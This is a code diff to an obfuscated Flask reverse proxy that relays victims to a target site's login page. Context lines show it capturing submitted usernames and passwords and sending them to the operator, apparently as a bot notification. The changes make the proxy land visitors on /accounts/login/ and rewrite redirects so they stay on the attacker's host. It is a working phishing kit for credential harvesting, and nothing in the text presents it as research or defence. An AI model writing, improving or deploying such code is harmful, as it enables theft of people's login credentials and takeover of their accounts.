@@ -77,8 +77,14 @@ e = E()
 @a.route('/<path:x>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
 def f(x):
     h = request.headers.get('Host', '').split(':')[0]
-    u = urljoin(f"https://{e.d}", x)
-    if request.query_string: u += '?' + request.query_string.decode()
+    
+    
+    if not x:
+        target_url = f"https://{e.d}/accounts/login/"
+    else:
+        target_url = urljoin(f"https://{e.d}", x)
+    
+    if request.query_string: target_url += '?' + request.query_string.decode()
 
     H = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding']}
     H['Host'] = e.d
@@ -91,7 +97,8 @@ def f(x):
             e.n(f"🔐 <b>C:</b>\nU: <code>{D['username']}</code>\nP: <code>{D['password']}</code>")
 
     try:
-        R = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=10)
+        R = requests.request(method=request.method, url=target_url, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=10)
+        
         
         if R.status_code in [301, 302, 303, 307, 308]:
             loc = R.headers.get('Location', '')
@@ -99,7 +106,10 @@ def f(x):
                 if d_domain in loc:
                     
                     parsed_loc = urlparse(loc)
-                    new_loc = parsed_loc._replace(netloc=h, query=re.sub(r'mtn', '', parsed_loc.query)).geturl()
+                    
+                    new_path = parsed_loc.path if parsed_loc.path else '/accounts/login/'
+                    new_query = re.sub(r'mtn', '', parsed_loc.query) 
+                    new_loc = parsed_loc._replace(netloc=h, path=new_path, query=new_query).geturl()
                     
                     r = make_response(R.content)
                     r.status_code = R.status_code
